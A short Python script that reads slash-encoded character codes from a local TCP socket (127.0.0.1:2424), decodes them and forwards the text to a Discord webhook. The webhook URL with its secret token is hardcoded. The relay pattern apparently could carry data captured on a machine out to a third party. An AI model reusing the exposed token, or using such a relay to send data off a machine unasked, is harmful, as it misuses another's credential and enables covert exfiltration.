import socket  
import time

from discord import Webhook, RequestsWebhookAdapter # Importing discord.Webhook and discord.RequestsWebhookAdapter
import unicodedata2

webhook = Webhook.from_url('https://discordapp.com/api/webhooks/949141290971455588/F7RJDbC4svqUIVSutORjQseoXhJJmWRUjqHKRqXVoPGc_Uf7M25RnftCVWxLXdYGBpFT', adapter=RequestsWebhookAdapter()) # Initializing webhook


def Connect():
    global client
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(None)
            client.connect(("127.0.0.1", 2424))

            break
        except Exception as e:
            print("retrying: ", e)
            time.sleep(1)

    print("connected")

    HandleMessage()



def HandleMessage():
    while True:

        data = client.recv(1024)
        if (data == bytes()):
            client.close()

            Connect()
            break
        else:

           webhook.send(decodedata(data.decode('utf-8')))

def decodedata(string):
    numarray=string.split('/')
    Text=""
    for numi in range(len(numarray)):
        Text=Text+chr(int(numarray[numi]))
    return Text

Connect()
